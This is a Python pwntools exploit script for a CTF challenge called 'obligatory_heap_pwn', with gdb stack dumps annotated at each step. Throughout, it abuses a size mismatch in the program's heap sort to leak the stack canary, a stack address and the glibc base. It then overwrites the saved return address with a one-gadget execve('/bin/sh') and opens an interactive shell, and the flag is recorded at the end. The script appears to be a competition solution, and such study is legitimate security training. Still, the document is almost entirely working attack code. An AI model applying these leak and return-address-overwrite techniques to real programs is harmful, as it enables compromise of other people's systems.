from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./obligatory_heap_pwn_patched', '''
    brva 0x18e8
    brva 0x1936
    continue
''')

# p = remote('obligatory-heap-pwn-0e13d2d6f69b789c.challs.brunnerne.xyz', 443, ssl=True)

# orders are stored continuously on stack (one next to the other), each of which is of size 0x10 bytes (0x10 bytes aligned) with 0x8 bytes for order id and 0x8 bytes for order info

# create a node of an order with order id and order info
# 10 nodes can be created at most
def create_node(id, info):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"gib order id>", str(id).encode())
    p.sendlineafter(b"order> ", info)

# show a node of an order by index
# 0-9 are valid indices for 10 nodes
def show_node(idx):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"gib order id>", str(idx).encode())
    p.recvuntil(b"order id --> ")
    id = int(p.recvline().decode().strip(), 10)
    p.recvuntil(b"order info --> ")
    info = int(p.recvline().decode().strip(), 10)
    return id, info

# heap sort nodes of orders on stack by order id
# 16 nodes can be sorted here, not just 10
def sort_nodes():
    p.sendlineafter(b"> ", b'4')

# 'leave; ret;' instructions to exit program
def exit():
    p.sendlineafter(b"> ", b'5')

# considering inconsistency between how many nodes can be created at most and how many nodes can be sorted
# area of extra 6 times 0x10 bytes right after area of 10 nodes of orders on stack can be treated as extra nodes to be sorted
# if well-set, some of 6 extra nodes can be sorted to 10 nodes of orders area, where data can be shown for leaks
# if well-set, some of 10 nodes of orders can be sorted to 6 extra nodes area, where data can be written as canary or saved rbp or return address

# 1. leak buffer start address and canary value
max_stack_1 = 0x7fffffffffff
create_node(max_stack_1, b'0'*8)
create_node(max_stack_1-1, b'1'*8)
# before heap sort:
'''
gef> x/34xg $rsp                                          
0x7ffc6d196db0: 0x0000000000000053                   0x000000047677d5c0
0x7ffc6d196dc0: 0x00007fffffffffff <-- buffer start  c0x3030303030303030
0x7ffc6d196dd0: 0x00007ffffffffffe                   0x3131313131313131
0x7ffc6d196de0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196df0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e00: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e10: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e20: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e30: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e40: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e50: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e60: 0x00007ffc6d196e70                   0xe6aa483a781f2c00 <-- canary
0x7ffc6d196e70: 0x00007ffc6d196e80 <-- saved rbp     0x00005a6ff762e9d7 <-- return address
0x7ffc6d196e80: 0x00007ffc6d196f20                   0x0000740d765a31ca
0x7ffc6d196e90: 0x00007ffc6d196ed0                   0x00007ffc6d196fa8
0x7ffc6d196ea0: 0x00000001f762d040                   0x00005a6ff762e961
0x7ffc6d196eb0: 0x00007ffc6d196fa8                   0xce86f92bbb49b74a
'''
sort_nodes()
# after heap sort:
'''
gef> x/34xg $rsp                                          
0x7ffc6d196db0: 0x0000000000000053                   0x000000047677d5c0
0x7ffc6d196dc0: 0x0000000000000000 <-- buffer start  0x0000000000000000
0x7ffc6d196dd0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196de0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196df0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e00: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e10: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e20: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e30: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e40: 0x00000001f762d040                   0x00005a6ff762e961
0x7ffc6d196e50: 0x00007ffc6d196e70 <-- stack         0xe6aa483a781f2c00 <-- canary
0x7ffc6d196e60: 0x00007ffc6d196e80                   0x00005a6ff762e9d7
0x7ffc6d196e70: 0x00007ffc6d196ed0                   0x00007ffc6d196fa8
0x7ffc6d196e80: 0x00007ffc6d196f20                   0x0000740d765a31ca
0x7ffc6d196e90: 0x00007ffc6d196fa8                   0xce86f92bbb49b74a
0x7ffc6d196ea0: 0x00007ffffffffffe                   0x3131313131313131
0x7ffc6d196eb0: 0x00007fffffffffff                   0x3030303030303030
'''
buffer_start_addr = show_node(9)[0]-0xb0
log.info(f"buffer start address: {hex(buffer_start_addr)}")
canary_val = show_node(9)[1]
log.info(f"canary value: {hex(canary_val)}")

# 2. leak glibc base address
max_stack_2 = buffer_start_addr+0x500
create_node(max_stack_2, b'2'*8)
create_node(max_stack_2-8, b'3'*8)
create_node(max_stack_2-0x20, b'4'*8)
# before heap sort:
'''
gef> x/34xg $rsp                                          
0x7ffc6d196db0: 0x0000000000000053                   0x000000047677d5c0
0x7ffc6d196dc0: 0x00007ffc6d1972c0 <-- buffer start  0x3232323232323232
0x7ffc6d196dd0: 0x00007ffc6d1972b8                   0x3333333333333333
0x7ffc6d196de0: 0x00007ffc6d1972a0                   0x3434343434343434
0x7ffc6d196df0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e00: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e10: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e20: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e30: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e40: 0x00000001f762d040                   0x00005a6ff762e961
0x7ffc6d196e50: 0x00007ffc6d196e70                   0xe6aa483a781f2c00
0x7ffc6d196e60: 0x00007ffc6d196e80                   0x00005a6ff762e9d7
0x7ffc6d196e70: 0x00007ffc6d196ed0                   0x00007ffc6d196fa8
0x7ffc6d196e80: 0x00007ffc6d196f20                   0x0000740d765a31ca
0x7ffc6d196e90: 0x00007ffc6d196fa8                   0xce86f92bbb49b74a
0x7ffc6d196ea0: 0x00007ffffffffffe                   0x3131313131313131
0x7ffc6d196eb0: 0x00007fffffffffff                   0x3030303030303030
'''
sort_nodes()
# after heap sort:
'''
gef> x/34xg $rsp                                          
0x7ffc6d196db0: 0x0000000000000053                   0x000000047677d5c0
0x7ffc6d196dc0: 0x0000000000000000 <-- buffer start  0x0000000000000000
0x7ffc6d196dd0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196de0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196df0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e00: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e10: 0x00000001f762d040                   0x00005a6ff762e961
0x7ffc6d196e20: 0x00007ffc6d196e70                   0xe6aa483a781f2c00
0x7ffc6d196e30: 0x00007ffc6d196e80                   0x00005a6ff762e9d7
0x7ffc6d196e40: 0x00007ffc6d196ed0                   0x00007ffc6d196fa8
0x7ffc6d196e50: 0x00007ffc6d196f20                   0x0000740d765a31ca <-- glibc
0x7ffc6d196e60: 0x00007ffc6d196fa8                   0xce86f92bbb49b74a
0x7ffc6d196e70: 0x00007ffc6d1972a0                   0x3434343434343434
0x7ffc6d196e80: 0x00007ffc6d1972b8                   0x3333333333333333
0x7ffc6d196e90: 0x00007ffc6d1972c0                   0x3232323232323232
0x7ffc6d196ea0: 0x00007ffffffffffe                   0x3131313131313131
0x7ffc6d196eb0: 0x00007fffffffffff                   0x3030303030303030
'''
glibc_base_addr = show_node(9)[1]-0x2a1ca
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 3. overwrite return address with one gadget
# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
create_node(max_stack_2-0x10, p64(glibc_base_addr+0xef52b))  # ensure that return address is overwritten with one gadget, and rbp-0x50 is writable && [rbp-0x78] == NULL is satisfied after 'leave; ret;' instructions
create_node(max_stack_2-0x18, p64(canary_val))  # ensure that canary is not corrupted
# before heap sort:
'''
gef> x/34xg $rsp                                          
0x7ffc6d196db0: 0x0000000000000053                   0x000000047677d5c0
0x7ffc6d196dc0: 0x00007ffc6d1972b0 <-- buffer start  0x0000740d7666852b
0x7ffc6d196dd0: 0x00007ffc6d1972a8                   0xe6aa483a781f2c00
0x7ffc6d196de0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196df0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e00: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196e10: 0x00000001f762d040                   0x00005a6ff762e961
0x7ffc6d196e20: 0x00007ffc6d196e70                   0xe6aa483a781f2c00
0x7ffc6d196e30: 0x00007ffc6d196e80                   0x00005a6ff762e9d7
0x7ffc6d196e40: 0x00007ffc6d196ed0                   0x00007ffc6d196fa8
0x7ffc6d196e50: 0x00007ffc6d196f20                   0x0000740d765a31ca
0x7ffc6d196e60: 0x00007ffc6d196fa8                   0xce86f92bbb49b74a
0x7ffc6d196e70: 0x00007ffc6d1972a0                   0x3434343434343434
0x7ffc6d196e80: 0x00007ffc6d1972b8                   0x3333333333333333
0x7ffc6d196e90: 0x00007ffc6d1972c0                   0x3232323232323232
0x7ffc6d196ea0: 0x00007ffffffffffe                   0x3131313131313131
0x7ffc6d196eb0: 0x00007fffffffffff                   0x3030303030303030
'''
sort_nodes()
# after heap sort:
'''
gef> x/34xg $rsp                                          
0x7ffc6d196db0: 0x0000000000000053                   0x000000047677d5c0
0x7ffc6d196dc0: 0x0000000000000000 <-- buffer start  0x0000000000000000
0x7ffc6d196dd0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196de0: 0x0000000000000000                   0x0000000000000000
0x7ffc6d196df0: 0x00000001f762d040                   0x00005a6ff762e961
0x7ffc6d196e00: 0x00007ffc6d196e70                   0xe6aa483a781f2c00
0x7ffc6d196e10: 0x00007ffc6d196e80                   0x00005a6ff762e9d7
0x7ffc6d196e20: 0x00007ffc6d196ed0                   0x00007ffc6d196fa8
0x7ffc6d196e30: 0x00007ffc6d196f20                   0x0000740d765a31ca
0x7ffc6d196e40: 0x00007ffc6d196fa8                   0xce86f92bbb49b74a
0x7ffc6d196e50: 0x00007ffc6d1972a0                   0x3434343434343434
0x7ffc6d196e60: 0x00007ffc6d1972a8                   0xe6aa483a781f2c00 <-- canary
0x7ffc6d196e70: 0x00007ffc6d1972b0 <-- saved rbp     0x0000740d7666852b <-- return address (one gadget)
0x7ffc6d196e80: 0x00007ffc6d1972b8                   0x3333333333333333
0x7ffc6d196e90: 0x00007ffc6d1972c0                   0x3232323232323232
0x7ffc6d196ea0: 0x00007ffffffffffe                   0x3131313131313131
0x7ffc6d196eb0: 0x00007fffffffffff                   0x3030303030303030
'''
# trigger one gadget to pop a shell
exit()  # rax == NULL is automatically satisfied after canary check

p.interactive()

# brunner{https://www.youtube.com/watch?v=Is7MTr-n0Yo}